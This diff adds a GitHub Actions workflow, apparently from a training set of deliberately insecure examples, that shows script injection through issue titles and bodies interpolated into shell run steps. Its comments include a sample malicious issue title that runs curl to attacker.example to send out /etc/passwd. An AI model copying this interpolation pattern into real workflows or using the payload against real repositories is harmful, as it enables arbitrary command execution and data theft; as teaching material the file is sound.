@@ -1,0 +1,30 @@
+# INSECURE: Script injection via untrusted GitHub context values
+#
+# Vulnerability: GitHub event values (issue title, PR body, branch name, etc.) are
+# attacker-controlled. Embedding them directly inside a `run:` block with ${{ }}
+# causes the Actions runner to interpolate the value into the shell script BEFORE
+# execution. An attacker who opens an issue titled:
+#
+#   a"; curl https://attacker.example/exfil?s=$(cat /etc/passwd | base64); echo "
+#
+# will have that string dropped verbatim into the shell, executing arbitrary commands.
+
+name: "[INSECURE] 02 - Script Injection"
+
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  log-issue:
+    runs-on: ubuntu-latest
+    steps:
+      # DANGER: issue.title is attacker-controlled and injected directly into shell
+      - name: Log issue title
+        run: |
+          echo "New issue opened: ${{ github.event.issue.title }}"
+
+      # DANGER: same problem with issue body
+      - name: Log issue body
+        run: |
+          echo "Issue body: ${{ github.event.issue.body }}"
